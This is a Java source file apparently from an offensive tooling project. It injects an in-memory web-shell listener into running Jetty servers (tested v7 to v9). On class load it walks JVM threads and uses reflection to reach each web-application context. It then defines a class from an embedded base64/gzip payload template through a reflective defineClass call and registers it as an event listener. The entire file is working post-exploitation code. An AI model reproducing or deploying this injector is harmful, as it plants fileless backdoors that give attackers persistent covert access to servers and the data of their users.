package com.reajason.javaweb.memshell.jetty.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.EventListener;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * tested v7、v8、v9
 *
 * @author ReaJason
 */
public class JettyListenerInjector {

    static {
        new JettyListenerInjector();
    }

    public JettyListenerInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object listener = getShell(context);
                inject(context, listener);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFieldValue(classLoader, "_context");
        Object handler = getFieldValue(context, "_servletHandler");
        return getFieldValue(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFieldValue(servletContext, "this$0");
                }
            }
        }
        throw new Exception("HttpConnection not found");
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    public static void inject(Object context, Object listener) throws Exception {
        if (isInjected(context, listener.getClass().getName())) {
            return;
        }
        invokeMethod(context, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
    }

    @SuppressWarnings("unchecked")
    public static boolean isInjected(Object context, String className) throws Exception {
        // jetty v8、 v9
        Object object = invokeMethod(context, "getEventListeners");
        Object[] eventListeners = new Object[0];
        if (object instanceof List) {
            eventListeners = ((List<Object>) object).toArray();
        } else if (object instanceof Object[]) {
            eventListeners = (Object[]) object;
        }
        for (Object eventListener : eventListeners) {
            if (eventListener.getClass().getName().contains(className)) {
                return true;
            }
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
